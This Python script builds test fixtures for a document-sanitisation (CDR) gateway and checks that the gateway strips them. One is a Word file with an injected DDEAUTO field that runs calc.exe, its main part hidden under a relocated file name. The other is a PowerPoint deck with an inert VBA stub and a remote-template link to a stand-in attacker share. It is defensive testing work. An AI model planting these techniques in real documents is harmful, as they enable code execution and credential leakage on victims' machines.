"""Build the REALISTIC viewer-validation fixtures — packages a viewer will
actually open, so a clean render is evidence rather than a coincidence.

Two cases:

1. p55_realistic.docx — a real python-docx document (proper styles, theme,
   settings, fonts) whose document part is relocated and declared via #55's
   Default Extension. A minimal hand-built package could fail to render for
   reasons unrelated to CDR, which would prove nothing either way.

2. pptm_vba_realistic — a genuine presentation carrying a VBA project and an
   external attachedTemplate rel. This exists because the repo's pptx_activex
   fixture has an empty _rels/.rels: no engine can load the *input*, so opening
   it in PowerPoint would say nothing about CDR. The loadability of both input
   and output is asserted at the call site of check_loads — not merely printed —
   because an unenforced check is the assumption that made the older fixture
   useless, wearing the costume of a test.
"""
import io,os,sys,zipfile,shutil,subprocess,tempfile
sys.path.insert(0,"/Users/douglasmun/Develop/aws-cdr-gateway/src")
os.environ.setdefault("SANITISED_BUCKET","t"); os.environ.setdefault("QUARANTINE_BUCKET","t")
import lambda_function as cdr
import docx
OUT="/Users/douglasmun/Develop/aws-cdr-gateway/docs/viewer-validation"

d=docx.Document()
d.add_heading("CDR Viewer Validation", 0)
d.add_paragraph("This document was produced by python-docx, then modified so its main "
                "document part is stored as word/doc.dat and declared wordprocessingml "
                "via an OPC Default Extension entry (pitfall #55).")
d.add_paragraph("Before PR #91 the DDE field below survived sanitisation intact.")
p=d.add_paragraph(); p.add_run("Bold run").bold=True; p.add_run(" and normal run.")
t=d.add_table(rows=2, cols=2); t.style="Table Grid"
for i,row in enumerate(t.rows):
    for j,c in enumerate(row.cells): c.text=f"cell {i},{j}"
d.add_paragraph("End of sample.")
b=io.BytesIO(); d.save(b); base=b.getvalue()

# inject the DDE field into document.xml, relocate the part, swap the declaration
zin=zipfile.ZipFile(io.BytesIO(base))
docxml=zin.read("word/document.xml").decode()
docxml=docxml.replace("</w:body>",
    '<w:p><w:r><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc.exe"'
    '</w:instrText></w:r></w:p></w:body>')
WML="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
out=io.BytesIO()
with zipfile.ZipFile(out,"w",zipfile.ZIP_DEFLATED) as z:
    for it in zin.infolist():
        data=zin.read(it.filename)
        if it.filename=="word/document.xml":
            z.writestr("word/doc.dat", docxml)          # relocated, non-XML suffix
        elif it.filename=="[Content_Types].xml":
            ct=data.decode()
            ct=ct.replace(f'<Override PartName="/word/document.xml" ContentType="{WML}"/>','')
            ct=ct.replace("</Types>", f'<Default Extension="dat" ContentType="{WML}"/></Types>')
            z.writestr(it.filename, ct)
        elif it.filename=="_rels/.rels":
            z.writestr(it.filename, data.decode().replace("word/document.xml","word/doc.dat"))
        elif it.filename=="word/_rels/document.xml.rels":
            z.writestr("word/_rels/doc.dat.rels", data)
        else:
            z.writestr(it.filename, data)
raw=out.getvalue()

pre = "DDEAUTO" in docx.Document(io.BytesIO(raw)).element.xml
print("INPUT realistic #55 package: python-docx sees DDEAUTO =", pre)
res=cdr.cdr_dispatch(raw,"docx")
print("dispatch:", res["status"], "removed:", res["report"]["removed"])
open(f"{OUT}/originals/in_p55_realistic.docx","wb").write(raw)
open(f"{OUT}/sanitised/p55_realistic.docx","wb").write(res["data"])
dd=docx.Document(io.BytesIO(res["data"]))
print("OUTPUT paragraphs:", len(dd.paragraphs), "tables:", len(dd.tables))
print("OUTPUT still has a live DDEAUTO target:", "_CDR_REMOVED_" not in dd.element.xml and "DDEAUTO" in dd.element.xml)


# ── PowerPoint: a genuine presentation carrying VBA + a remote template ───────
#
# Why this is built by hand rather than taken from docs/fixtures: pptx_activex
# there has an empty _rels/.rels, so nothing points from the package root to the
# presentation and NO engine can load the input. A viewer rejecting it would say
# nothing about CDR. This package has the real officeDocument rel, a slide master,
# a layout, a theme and actual slide text, so both fidelity and neutralisation
# become checkable.

P = "http://schemas.openxmlformats.org/presentationml/2006/main"
A = "http://schemas.openxmlformats.org/drawingml/2006/main"
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG = "http://schemas.openxmlformats.org/package/2006/relationships"

CT = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
<Override PartName="/ppt/presentation.xml" ContentType="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>
<Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
<Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
<Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
<Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
</Types>"""

RELS = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PKG}">
<Relationship Id="rId1" Type="{R}/officeDocument" Target="ppt/presentation.xml"/>
<Relationship Id="rId2" Type="{R}/metadata/core-properties" Target="docProps/core.xml"/>
<Relationship Id="rId3" Type="{R}/extended-properties" Target="docProps/app.xml"/>
</Relationships>"""

PRES = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:a="{A}" xmlns:r="{R}" xmlns:p="{P}">
<p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>
<p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>
<p:sldSz cx="9144000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/>
</p:presentation>"""

# VBA project + remote template are the threats; both declared with real rels.
PRES_RELS = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PKG}">
<Relationship Id="rId1" Type="{R}/slideMaster" Target="slideMasters/slideMaster1.xml"/>
<Relationship Id="rId2" Type="{R}/slide" Target="slides/slide1.xml"/>
<Relationship Id="rId3" Type="{R}/theme" Target="theme/theme1.xml"/>
<Relationship Id="rId4" Type="{R}/vbaProject" Target="vbaProject.bin"/>
<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\attacker.invalid\\share\\evil.potm" TargetMode="External"/>
</Relationships>"""

def txbox(idx, x, y, cx, cy, text, size=2400, bold=0):
    return f"""<p:sp><p:nvSpPr><p:cNvPr id="{idx}" name="TextBox {idx}"/>
<p:cNvSpPr txBox="1"/><p:nvPr/></p:nvSpPr>
<p:spPr><a:xfrm><a:off x="{x}" y="{y}"/><a:ext cx="{cx}" cy="{cy}"/></a:xfrm>
<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr>
<p:txBody><a:bodyPr wrap="square"><a:spAutoFit/></a:bodyPr><a:lstStyle/>
<a:p><a:r><a:rPr lang="en-US" sz="{size}" b="{bold}" dirty="0"/><a:t>{text}</a:t></a:r></a:p>
</p:txBody></p:sp>"""

SLIDE = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:a="{A}" xmlns:r="{R}" xmlns:p="{P}">
<p:cSld><p:spTree>
<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
<p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
{txbox(2, 838200, 1143000, 7467600, 1200000, "CDR Viewer Validation - PowerPoint", 3200, 1)}
{txbox(3, 838200, 2590800, 7467600, 1600000, "This deck carried a VBA project and a remote-template link before sanitisation. Both should be gone. No macro warning, no prompt to fetch a template.", 1600)}
{txbox(4, 838200, 4400000, 7467600, 800000, "If this slide renders with both text boxes, fidelity survived the rebuild.", 1400)}
</p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sld>"""

SLIDE_RELS = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PKG}">
<Relationship Id="rId1" Type="{R}/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>"""

EMPTY_TREE = f"""<p:cSld><p:spTree>
<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
<p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
</p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr>"""

LAYOUT = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldLayout xmlns:a="{A}" xmlns:r="{R}" xmlns:p="{P}" type="blank" preserve="1">
{EMPTY_TREE}</p:sldLayout>"""

LAYOUT_RELS = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PKG}">
<Relationship Id="rId1" Type="{R}/slideMaster" Target="../slideMasters/slideMaster1.xml"/>
</Relationships>"""

CLRMAP = ('<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" '
          'accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" '
          'accent6="accent6" hlink="hlink" folHlink="folHlink"/>')

MASTER = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldMaster xmlns:a="{A}" xmlns:r="{R}" xmlns:p="{P}">
<p:cSld><p:spTree>
<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
<p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
</p:spTree></p:cSld>{CLRMAP}
<p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst>
</p:sldMaster>"""

MASTER_RELS = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PKG}">
<Relationship Id="rId1" Type="{R}/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
<Relationship Id="rId2" Type="{R}/theme" Target="../theme/theme1.xml"/>
</Relationships>"""

def font_scheme():
    maj = '<a:latin typeface="Calibri Light"/><a:ea typeface=""/><a:cs typeface=""/>'
    mnr = '<a:latin typeface="Calibri"/><a:ea typeface=""/><a:cs typeface=""/>'
    return (f'<a:fontScheme name="Office"><a:majorFont>{maj}</a:majorFont>'
            f'<a:minorFont>{mnr}</a:minorFont></a:fontScheme>')

def clr_scheme():
    c = ['<a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>',
         '<a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1>',
         '<a:dk2><a:srgbClr val="44546A"/></a:dk2>',
         '<a:lt2><a:srgbClr val="E7E6E6"/></a:lt2>']
    for i, v in enumerate(("4472C4","ED7D31","A5A5A5","FFC000","5B9BD5","70AD47"), 1):
        c.append(f'<a:accent{i}><a:srgbClr val="{v}"/></a:accent{i}>')
    c.append('<a:hlink><a:srgbClr val="0563C1"/></a:hlink>')
    c.append('<a:folHlink><a:srgbClr val="954F72"/></a:folHlink>')
    return '<a:clrScheme name="Office">' + "".join(c) + '</a:clrScheme>'

FILL = ('<a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
        '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
        '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:fillStyleLst>')
LINE = ('<a:lnStyleLst><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln>'
        '<a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln>'
        '<a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln></a:lnStyleLst>')
EFFECT = ('<a:effectStyleLst><a:effectStyle><a:effectLst/></a:effectStyle>'
          '<a:effectStyle><a:effectLst/></a:effectStyle>'
          '<a:effectStyle><a:effectLst/></a:effectStyle></a:effectStyleLst>')
BG = ('<a:bgFillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
      '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
      '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:bgFillStyleLst>')

THEME = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:theme xmlns:a="{A}" name="Office Theme"><a:themeElements>
{clr_scheme()}{font_scheme()}
<a:fmtScheme name="Office">{FILL}{LINE}{EFFECT}{BG}</a:fmtScheme>
</a:themeElements></a:theme>"""

CORE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:title>CDR Viewer Validation - PowerPoint</dc:title>
<dc:creator>CDR corpus generator</dc:creator>
</cp:coreProperties>"""

APP = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
<Application>Microsoft Office PowerPoint</Application><Slides>1</Slides>
</Properties>"""

# Inert VBA stand-in: an OLE compound-file header plus a recognisable AutoOpen-ish
# body. Not a working macro -- the point is that CDR must drop the part and its rel.
VBA = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 24
       + b"CDR_TEST_PPTX_VBA_MARKER Sub Auto_Open() Shell \"calc.exe\" End Sub"
       + b"\x00" * 256)


def build():
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", CT)
        z.writestr("_rels/.rels", RELS)
        z.writestr("docProps/core.xml", CORE)
        z.writestr("docProps/app.xml", APP)
        z.writestr("ppt/presentation.xml", PRES)
        z.writestr("ppt/_rels/presentation.xml.rels", PRES_RELS)
        z.writestr("ppt/slides/slide1.xml", SLIDE)
        z.writestr("ppt/slides/_rels/slide1.xml.rels", SLIDE_RELS)
        z.writestr("ppt/slideLayouts/slideLayout1.xml", LAYOUT)
        z.writestr("ppt/slideLayouts/_rels/slideLayout1.xml.rels", LAYOUT_RELS)
        z.writestr("ppt/slideMasters/slideMaster1.xml", MASTER)
        z.writestr("ppt/slideMasters/_rels/slideMaster1.xml.rels", MASTER_RELS)
        z.writestr("ppt/theme/theme1.xml", THEME)
        z.writestr("ppt/vbaProject.bin", VBA)
    return b.getvalue()

def check_loads(path, label):
    """Return True if a real engine loads the package, False if it does not, and
    None only when no engine is installed to ask.

    The caller MUST act on the result -- see the assert at the call site. An
    earlier version of this returned the verdict and the caller discarded it, so
    a package no engine could open still produced a green run and a written
    fixture. That is precisely the pptx_activex defect this fixture exists to
    avoid, and it would have regressed in silence."""
    if shutil.which("soffice") is None:
        print(f"  {label}: soffice absent - LOADABILITY UNVERIFIED")
        return None
    with tempfile.TemporaryDirectory() as td:
        shutil.copy(path, os.path.join(td, os.path.basename(path)))
        # Impress has no txt filter; convert to PDF and confirm a page came out.
        proc = subprocess.run(["soffice", "--headless", "--convert-to", "pdf",
                               "--outdir", td, os.path.join(td, os.path.basename(path))],
                              capture_output=True, timeout=180)
        pdf = os.path.join(td, os.path.splitext(os.path.basename(path))[0] + ".pdf")
        ok = os.path.exists(pdf) and os.path.getsize(pdf) > 0
        if not ok and proc.returncode != 0:
            print(f"  {label}: soffice exit={proc.returncode} "
                  f"stderr={proc.stderr.decode('utf-8', 'replace')[:200]}")
        print(f"  {label}: LibreOffice load = {'OK' if ok else 'FAILED'}")
        return ok


def threat_tokens(raw):
    """Count threat markers in the DECOMPRESSED parts.

    Scanning the raw ZIP bytes silently reports zero for everything, because the
    entries are deflated -- which reads exactly like a clean file. Cost a real
    false-clean during development; decompress first.
    """
    z = zipfile.ZipFile(io.BytesIO(raw))
    blob = b"".join(z.read(n) for n in z.namelist())
    toks = {
        "vba marker":       b"CDR_TEST_PPTX_VBA_MARKER",
        "Shell calc.exe":   b'Shell "calc.exe"',
        "Auto_Open":        b"Auto_Open",
        "remote template":  b"attacker.invalid",
        "OLE header":       b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    }
    return {k: (v in blob) for k, v in toks.items()}, (b"CDR Viewer Validation" in blob)


print("\n=== PowerPoint: realistic .pptm (VBA + remote template) ===")
pptm = build()
open(f"{OUT}/originals/in_pptm_vba_realistic.pptm", "wb").write(pptm)

pre, pre_text = threat_tokens(pptm)
print("  INPUT  threats:", {k: v for k, v in pre.items()})
assert all(pre.values()), f"positive control FAILED - probe is blind: {pre}"
assert pre_text, "input has no slide text - fidelity could not be judged"

res = cdr.cdr_dispatch(pptm, "pptm")
print(f"  dispatch: {res['status']} -> .{res.get('sanitised_ext')}")
print(f"  removed: {res['report'].get('removed')}")
assert res["status"] == "sanitised", res
out_path = f"{OUT}/sanitised/pptm_vba_realistic.{res['sanitised_ext']}"
open(out_path, "wb").write(res["data"])

post, post_text = threat_tokens(res["data"])
print("  OUTPUT threats:", {k: v for k, v in post.items()})
assert not any(post.values()), f"THREAT SURVIVED: {post}"
assert post_text, "slide text lost - CDR over-stripped the presentation"
# Count derived from the probe, never hardcoded: a literal drifts the moment a
# token is added or removed, and this number gets quoted in CHECKLIST.md and PR
# bodies as if it were measured. It said 6 while the probe checked 5.
print(f"  {sum(pre.values())} threat indicators in, {sum(post.values())} out; "
      "slide text preserved")

loads_in = check_loads(f"{OUT}/originals/in_pptm_vba_realistic.pptm", "input ")
loads_out = check_loads(out_path, "output")
# Act on the verdict. A fixture no engine can open is worthless for viewer
# validation -- that is the whole reason this file exists. None means soffice
# is absent, which is unverified rather than failed, so it does not fail here.
assert loads_in is not False, "INPUT does not load in LibreOffice - fixture is defective"
assert loads_out is not False, "OUTPUT does not load in LibreOffice - CDR broke the package"
